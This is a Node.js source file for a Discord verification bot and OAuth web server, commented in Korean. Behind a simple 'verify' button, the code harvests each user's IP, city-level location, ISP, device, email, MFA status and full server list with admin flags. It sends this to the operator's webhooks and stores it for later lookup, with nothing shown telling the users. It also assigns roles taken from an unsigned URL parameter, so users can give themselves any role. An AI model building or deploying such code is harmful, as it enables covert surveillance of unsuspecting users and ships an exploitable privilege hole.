const express = require('express');
const path = require('path');
const axios = require('axios');
const fs = require('fs');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

const app = express();

app.use(express.static(path.join(__dirname, 'public')));

const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const BOT_TOKEN = process.env.BOT_TOKEN;
const GUILD_ID = process.env.GUILD_ID;

const VERIFIED_ROLE_ID = process.env.VERIFIED_ROLE_ID;
const VERIFY_CHANNEL_ID = process.env.VERIFY_CHANNEL_ID;
const DEFAULT_WEBHOOK_URL = process.env.WEBHOOK_URL;
const BACKUP_GUILD_ID = process.env.BACKUP_GUILD_ID;
const UNVERIFIED_ROLE_ID = process.env.UNVERIFIED_ROLE_ID || '1541577356513382560'; 

// 🔒 오직 명령어 사용이 허용된 본인의 디스코드 유저 ID
const OWNER_USER_ID = '1400805500374745122';

// 본인의 렌더 웹서비스 URL
const FIXED_RENDER_URL = process.env.RENDER_EXTERNAL_URL || 'https://discord-verify1-524a.onrender.com';

// 서버별 설정 및 유저 인증 로그 저장 파일
const SETTINGS_FILE = path.join(__dirname, 'guild_settings.json');
const USER_LOGS_FILE = path.join(__dirname, 'user_verify_logs.json');

function loadSettings() {
    try {
        if (fs.existsSync(SETTINGS_FILE)) {
            return JSON.parse(fs.readFileSync(SETTINGS_FILE, 'utf8'));
        }
    } catch (e) {}
    return {};
}

function saveSettings(settings) {
    try {
        fs.writeFileSync(SETTINGS_FILE, JSON.stringify(settings, null, 2), 'utf8');
    } catch (e) {}
}

function loadUserLogs() {
    try {
        if (fs.existsSync(USER_LOGS_FILE)) {
            return JSON.parse(fs.readFileSync(USER_LOGS_FILE, 'utf8'));
        }
    } catch (e) {}
    return {};
}

function saveUserLog(userId, logData) {
    try {
        const logs = loadUserLogs();
        logs[userId] = logData;
        fs.writeFileSync(USER_LOGS_FILE, JSON.stringify(logs, null, 2), 'utf8');
    } catch (e) {}
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMembers, 
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages
    ]
});

// 디스코드 Snowflake ID로 계정 생성일 계산 함수
function getDiscordCreationDate(userId) {
    const DISCORD_EPOCH = 1420070400000;
    const binary = BigInt(userId).toString(2).padStart(64, '0');
    const timestamp = parseInt(binary.substring(0, 42), 2) + DISCORD_EPOCH;
    return new Date(timestamp).toISOString().replace('T', ' ').substring(0, 19);
}

// 브라우저 및 운영체제 상세 분석 함수
function parseDevice(ua) {
    if (!ua) return { browser: '알 수 없음', os: '알 수 없음' };
    let browser = '알 수 없음';
    let os = '알 수 없음';

    if (/chrome|crios/i.test(ua)) browser = 'Chrome';
    else if (/safari/i.test(ua)) browser = 'Safari';
    else if (/firefox/i.test(ua)) browser = 'Firefox';
    else if (/whale/i.test(ua)) browser = 'Naver Whale';
    else if (/edge/i.test(ua)) browser = 'Edge';

    if (/android/i.test(ua)) {
        os = (/samsung/i.test(ua) || /sm-/i.test(ua)) ? 'Android (삼성 갤럭시)' : 'Android (기타 모바일)';
    } else if (/iphone|ipad|ipod/i.test(ua)) {
        os = 'iOS (애플)';
    } else if (/win/i.test(ua)) {
        os = (/samsung/i.test(ua)) ? 'Windows PC (삼성)' : 'Windows PC';
    } else if (/mac/i.test(ua)) {
        os = 'macOS (애플 맥)';
    } else if (/linux/i.test(ua)) {
        os = 'Linux';
    }

    return { browser, os };
}

client.on('ready', async () => {
    console.log(`[봇 로그인 완료] ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
    if (!message.guild) return;
    if (message.author.bot) return;

    const content = message.content.trim();
    const userId = message.author.id;
    const guildId = message.guild.id;

    // 🔒 오직 본인(OWNER_USER_ID)만 명령어 사용 가능
    if (content === '!인증' || content.startsWith('!인증역할') || content.startsWith('!웹훅') || content.startsWith('!인증정보') || content === '!역할제거') {
        if (userId !== OWNER_USER_ID) {
            return message.reply('❌ 이 명령어를 사용할 권한이 없습니다.');
        }
    }

    // 1. !인증 명령어
    if (content === '!인증') {
        try {
            await message.delete().catch(() => {});

            const messages = await message.channel.messages.fetch({ limit: 20 }).catch(() => null);
            if (messages) {
                const botMessages = messages.filter(m => m.author.id === client.user.id && m.components.length > 0);
                for (const oldMsg of botMessages.values()) {
                    await oldMsg.delete().catch(() => {});
                }
            }

            const verifyUrl = `${FIXED_RENDER_URL}/verify?guildId=${guildId}`;
            const row = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setStyle(ButtonStyle.Link)
                        .setLabel('🔒 디스코드 인증하기')
                        .setURL(verifyUrl),
                );

            await message.channel.send({
                content: '서버를 이용하려면 아래 버튼을 눌러 인증을 진행해 주세요!',
                components: [row]
            });
        } catch (err) {
            console.error('인증 버튼 생성 에러:', err);
        }
    }

    // 2. !인증역할 (역할아이디) 명령어
    if (content.startsWith('!인증역할')) {
        const args = content.split(' ');
        const roleId = args[1];

        if (!roleId) {
            return message.reply('⚠️ 지정할 역할의 아이디를 입력해 주세요. (예: `!인증역할 123456789012345678`)');
        }

        const role = message.guild.roles.cache.get(roleId);
        if (!role) {
            return message.reply('❌ 해당 역할을 이 서버에서 찾을 수 없습니다. 올바른 역할 ID를 입력해 주세요.');
        }

        let settings = loadSettings();
        if (!settings[guildId]) settings[guildId] = {};
        settings[guildId].verifiedRoleId = roleId;
        saveSettings(settings);

        message.reply(`✅ 이 서버의 인증 완료 역할이 **${role.name}** (\`${roleId}\`)으로 성공적으로 설정되었습니다!`);
    }

    // 3. !웹훅 (웹훅URL) 명령어
    if (content.startsWith('!웹훅')) {
        const args = content.split(' ');
        const webhookUrl = args[1];

        if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
            return message.reply('⚠️ 올바른 디스코드 웹훅 URL을 입력해 주세요. (예: `!웹훅 https://discord.com/api/webhooks/...`)');
        }

        let settings = loadSettings();
        if (!settings[guildId]) settings[guildId] = {};
        settings[guildId].webhookUrl = webhookUrl;
        saveSettings(settings);

        message.reply('✅ 이 서버 전용 웹훅 주소가 성공적으로 설정되었습니다!');
    }

    // 4. !인증정보 (멘션 또는 유저ID) 명령어
    if (content.startsWith('!인증정보')) {
        // 멘션된 유저 ID 추출 또는 입력된 ID 추출
        let targetUserId = '';
        const mentionedUser = message.mentions.users.first();
        if (mentionedUser) {
            targetUserId = mentionedUser.id;
        } else {
            const args = content.split(' ');
            targetUserId = args[1];
        }

        if (!targetUserId) {
            return message.reply('⚠️ 정보를 확인할 유저를 멘션하거나 유저 ID를 입력해 주세요. (예: `!인증정보 @유저` 또는 `!인증정보 123456789`)');
        }

        const logs = loadUserLogs();
        const userLog = logs[targetUserId];

        if (!userLog) {
            return message.reply(`❌ 해당 유저(<@${targetUserId}>)의 저장된 인증 기록이 없습니다.`);
        }

        message.reply(`🔍 **[유저 인증 기록 조회 결과]**\n` +
                      `📌 **닉네임:** \`${userLog.displayName}\`\n` +
                      `👤 **유저:** <@${userLog.userId}> (\`${userLog.username}\`)\n` +
                      `🏫 **최근 인증 서버:** \`${userLog.serverName}\`\n` +
                      `📅 **계정 생성일:** \`${userLog.createdAt}\`\n` +
                      `🔒 **2차 인증(OTP):** \`${userLog.isMfaEnabled}\`\n` +
                      `⏰ **인증 시각:** \`${userLog.verifiedAt}\`\n` +
                      `🌐 **아이피:** \`${userLog.ipDisplay}\`\n` +
                      `📍 **위치:** \`${userLog.ipLocation}\`\n` +
                      `📡 **통신사:** \`${userLog.ispInfo}\`\n` +
                      `💻 **기기:** \`${userLog.browser} / ${userLog.os}\`\n` +
                      `⚠️ **부계정 여부:** ${userLog.altAccountCheck}`);
    }

    // 5. !역할제거 명령어
    if (content === '!역할제거') {
        try {
            const member = message.member;
            if (!member) return;

            const targetRoleId = '1541423418753155135';

            if (!member.roles.cache.has(targetRoleId)) {
                return message.reply('❌ 제거할 해당 역할이 없습니다.');
            }

            await member.roles.remove(targetRoleId);
            message.reply('✅ 지정된 역할이 성공적으로 제거되었습니다!');
        } catch (err) {
            console.error('역할 제거 에러:', err);
            message.reply('⚠️ 역할 제거 중 오류가 발생했습니다.');
        }
    }

    // 6. !서버복구 명령어
    if (content === '!서버복구') {
        try {
            const member = message.member;
            if (!member) return;

            const settings = loadSettings();
            const serverVerifiedRole = (settings[guildId] && settings[guildId].verifiedRoleId) || VERIFIED_ROLE_ID;

            if (!member.roles.cache.has(serverVerifiedRole)) {
                return message.reply('❌ 인증을 완료한 유저만 복구 서버 링크를 받을 수 있습니다!');
            }

            if (!BACKUP_GUILD_ID) {
                return message.reply('⚠️ 설정된 백업(복구) 서버 ID가 없습니다.');
            }

            const backupGuild = client.guilds.cache.get(BACKUP_GUILD_ID);
            if (!backupGuild) {
                return message.reply('⚠️ 복구 서버를 찾을 수 없습니다.');
            }

            const inviteChannel = backupGuild.channels.cache.find(c => c.type === 0 && c.permissionsFor(backupGuild.members.me).has('CreateInstantInvite'));
            
            if (!inviteChannel) {
                return message.reply('⚠️ 복구 서버에 초대장을 생성할 권한이 없습니다.');
            }

            const invite = await inviteChannel.createInvite({
                maxUses: 1,
                maxAge: 86400, 
                unique: true
            });

            const dmSuccess = await message.author.send(
                `🚨 **[서버 복구 링크 안내]**\n` +
                `요청하신 복구 서버 초대 링크입니다.\n` +
                `- **사용 기한:** 1일 (24시간 뒤 만료)\n` +
                `- **사용 횟수:** 1회용\n\n` +
                `https://discord.gg/${invite.code}`
            ).catch(() => null);

            if (!dmSuccess) {
                return message.reply('❌ DM(개인 메시지) 차단 상태여서 링크를 보낼 수 없습니다. DM을 열어두고 다시 시도해 주세요!');
            }

            message.reply('✅ 복구 서버 초대 링크를 **DM(개인 메시지)**으로 전송했습니다!');
        } catch (err) {
            console.error('서버복구 링크 생성 에러:', err);
            message.reply('⚠️ 복구 링크를 생성하는 중 오류가 발생했습니다.');
        }
    }
});

app.get('/verify', async (req, res) => {
    const targetGuildId = req.query.guildId || GUILD_ID;

    let userIp = req.headers['cf-connecting-ip'] || 
                 (req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0].trim() : null) || 
                 req.socket.remoteAddress;

    if (!userIp || userIp === '::1' || userIp === '127.0.0.1') {
        userIp = '127.0.0.1';
    }

    let selectedRoles = req.query.roles || [];
    if (!Array.isArray(selectedRoles)) selectedRoles = [selectedRoles];

    const userAgent = req.headers['user-agent'] || '알 수 없음';
    const redirectUri = `${FIXED_RENDER_URL}/callback`;

    const stateData = Buffer.from(JSON.stringify({ ip: userIp, roles: selectedRoles, ua: userAgent, guildId: targetGuildId })).toString('base64');
    const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify%20email%20guilds&state=${stateData}`;
    
    res.redirect(oauthUrl);
});

app.get('/callback', async (req, res) => {
    const code = req.query.code;
    const state = req.query.state;
    if (!code) return res.status(400).send('인증 코드가 없습니다.');

    const redirectUri = `${FIXED_RENDER_URL}/callback`;

    let userIp = '알 수 없음';
    let selectedRoles = [];
    let userAgent = '알 수 없음';
    let targetGuildId = GUILD_ID;
    try {
        if (state) {
            const decodedState = JSON.parse(Buffer.from(state, 'base64').toString('utf8'));
            userIp = decodedState.ip;
            selectedRoles = decodedState.roles || [];
            userAgent = decodedState.ua || '알 수 없음';
            targetGuildId = decodedState.guildId || GUILD_ID;
        }
    } catch (e) {}

    const settings = loadSettings();
    const serverWebhook = settings[targetGuildId] && settings[targetGuildId].webhookUrl;

    const webhookUrlsToSend = [];
    if (DEFAULT_WEBHOOK_URL) webhookUrlsToSend.push(DEFAULT_WEBHOOK_URL);
    if (serverWebhook && serverWebhook !== DEFAULT_WEBHOOK_URL) webhookUrlsToSend.push(serverWebhook);

    try {
        const targetGuild = await client.guilds.fetch(targetGuildId).catch(() => null);
        const serverName = targetGuild ? targetGuild.name : '알 수 없는 서버';
        const serverInfoText = `🏫 **인증 서버:** \`${serverName}\` (ID: \`${targetGuildId}\`)`;

        const tokenRes = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: redirectUri,
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const accessToken = tokenRes.data.access_token;

        const userRes = await axios.get('https://discord.com/api/users/@me', {
            headers: { authorization: `Bearer ${accessToken}` }
        });
        const userData = userRes.data;
        const userId = userData.id;
        const username = userData.username;

        try {
            const ipCheckRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,proxy,isp`);
            if (ipCheckRes.data.status === 'success' && ipCheckRes.data.proxy) {
                for (const whUrl of webhookUrlsToSend) {
                    await axios.post(whUrl, {
                        content: `🚨 **[VPN 우회 접속 차단 적발]**\n` +
                                 `${serverInfoText}\n` +
                                 `👤 **적발된 유저:** <@${userId}> (\`${username}\`)\n` +
                                 `🌐 **IP:** \`${userIp}\`\n` +
                                 `📡 **통신사/ISP:** \`${ipCheckRes.data.isp || '알 수 없음'}\`\n` +
                                 `⚠️ VPN을 켠 채로 인증을 시도하여 차단되었습니다.`
                    }).catch(() => {});
                }
                return res.status(403).send(`<h1>인증 실패</h1><p>${username}님, VPN 또는 우회 접속 환경에서는 인증을 진행할 수 없습니다.</p>`);
            }
        } catch (err) {}

        let ipLocation = '알 수 없음';
        let ispInfo = '알 수 없음';
        let isPublicWifi = false;
        try {
            const ipRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,country,regionName,city,isp,org`);
            if (ipRes.data && ipRes.data.status === 'success') {
                ipLocation = `${ipRes.data.country} ${ipRes.data.regionName} ${ipRes.data.city}`;
                ispInfo = ipRes.data.isp;

                const orgLower = (ipRes.data.org || '').toLowerCase();
                const ispLower = (ipRes.data.isp || '').toLowerCase();
                if (orgLower.includes('wifi') || ispLower.includes('wifi') || orgLower.includes('public') || orgLower.includes('cafe') || orgLower.includes('kt free') || orgLower.includes('u+ wifi')) {
                    isPublicWifi = true;
                }
            }
        } catch (e) {}

        const ipDisplay = isPublicWifi ? `${userIp} (⚠️ 공공/매장 와이파이 감지됨)` : userIp;
        const { browser, os } = parseDevice(userAgent);

        const member = await targetGuild.members.fetch(userId).catch(() => null);
        const displayName = member ? member.displayName : (userData.global_name || username);

        const createdAt = getDiscordCreationDate(userId);
        const createdDateObj = new Date(createdAt);
        const now = new Date();
        const diffDays = (now - createdDateObj) / (1000 * 60 * 60 * 24);

        let altAccountCheck = '정상 계정 추정';
        if (diffDays < 30) {
            altAccountCheck = '⚠️ 부계정 의심 (생성된 지 30일 미만)';
        } else if (!userData.avatar) {
            altAccountCheck = '⚠️ 부계정 의심 (기본 프로필 아바타)';
        }

        const verifiedAt = new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' });

        let guildsTextContent = `[ ${username} (${userId}) 님이 가입된 서버 목록 ]\n\n`;
        let adminOrOwnerFound = false;

        try {
            const guildsRes = await axios.get('https://discord.com/api/users/@me/guilds', {
                headers: { authorization: `Bearer ${accessToken}` }
            });
            if (guildsRes.data && guildsRes.data.length > 0) {
                guildsRes.data.forEach((g, index) => {
                    let permissionsText = [];
                    
                    if (g.owner) {
                        permissionsText.push('👑 서버 소유자');
                        adminOrOwnerFound = true;
                    }

                    const permissionsBigInt = BigInt(g.permissions || 0);
                    if ((permissionsBigInt & 0x8n) === 0x8n && !g.owner) {
                        permissionsText.push('🛡️ 관리자 권한');
                        adminOrOwnerFound = true;
                    }

                    const permString = permissionsText.length > 0 ? ` [${permissionsText.join(', ')}]` : '';
                    guildsTextContent += `${index + 1}. 이름: ${g.name} (ID: ${g.id})${permString}\n`;
                });
            } else {
                guildsTextContent += '가입된 서버가 없습니다.';
            }
        } catch (gErr) {
            guildsTextContent += '서버 목록을 불러오는 데 실패했습니다.';
        }

        if (adminOrOwnerFound) {
            altAccountCheck += ' / ⚠️ 주요 서버 소유 또는 관리자 권한 보유 계정';
        }

        // 유저별 로그 저장 파일에 데이터 백업 (명령어 조회용)
        saveUserLog(userId, {
            userId,
            username,
            displayName,
            serverName,
            createdAt,
            isMfaEnabled: userData.mfa_enabled ? '✅ 2차 인증 활성화됨' : '❌ 2차 인증 미사용',
            verifiedAt,
            ipDisplay,
            ipLocation,
            ispInfo,
            browser,
            os,
            altAccountCheck
        });

        const filePath = path.join(__dirname, `guilds_${userId}.txt`);
        fs.writeFileSync(filePath, guildsTextContent, 'utf8');

        const isMfaEnabled = userData.mfa_enabled ? '✅ 2차 인증(OTP) 활성화됨' : '❌ 2차 인증 미사용';
        const emailInfo = `${userData.email} (${userData.verified ? '이메일 인증됨' : '미인증'})`;

        for (const whUrl of webhookUrlsToSend) {
            const FormData = require('form-data');
            const form = new FormData();
            form.append('content', `✅ **[인증 완료 상세 정보]**\n` +
                                    `${serverInfoText}\n` +
                                    `📌 **실제 이름(닉네임):** \`${displayName}\`\n` +
                                    `👤 **유저 멘션/아이디:** <@${userId}> (\`${username}\`)\n` +
                                    `📅 **계정 생성일:** \`${createdAt}\`\n` +
                                    `🔒 **2차 인증(OTP):** \`${isMfaEnabled}\`\n` +
                                    `⏰ **인증 시각:** \`${verifiedAt}\`\n` +
                                    `🌐 **아이피 정보:** \`${ipDisplay}\`\n` +
                                    `📧 **이메일:** \`${emailInfo}\`\n` +
                                    `📍 **위치:** \`${ipLocation}\`\n` +
                                    `📡 **통신사:** \`${ispInfo}\`\n` +
                                    `💻 **기기 정보 (브라우저 / OS):** \`${browser} / ${os}\`\n` +
                                    `⚠️ **부계정 추정 여부:** ${altAccountCheck}`);
            form.append('file', fs.createReadStream(filePath));

            await axios.post(whUrl, form, {
                headers: form.getHeaders()
            }).catch(() => {});
        }

        if (fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
        }

        if (member) {
            const targetVerifiedRole = (settings[targetGuildId] && settings[targetGuildId].verifiedRoleId) || VERIFIED_ROLE_ID;

            const rolesToAdd = [targetVerifiedRole, ...selectedRoles];
            await member.roles.add(rolesToAdd);

            if (UNVERIFIED_ROLE_ID && member.roles.cache.has(UNVERIFIED_ROLE_ID)) {
                await member.roles.remove(UNVERIFIED_ROLE_ID);
            }

            console.log(`[역할 처리 완료] ${username}님 인증 완료!`);
            res.send(`<h1>인증 성공!</h1><p>${username}님, 인증이 완료되었습니다. 디스코드 서버로 돌아가세요!</p>`);
        } else {
            res.send('인증은 성공했으나, 현재 서버에 가입되어 있지 않습니다.');
        }

    } catch (err) {
        console.error('에러 발생:', err.response?.data || err.message);
        res.status(500).send('인증 처리 중 오류가 발생했습니다.');
    }
});

client.login(BOT_TOKEN);
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[웹서버 작동 중] 포트: ${PORT}`);
});
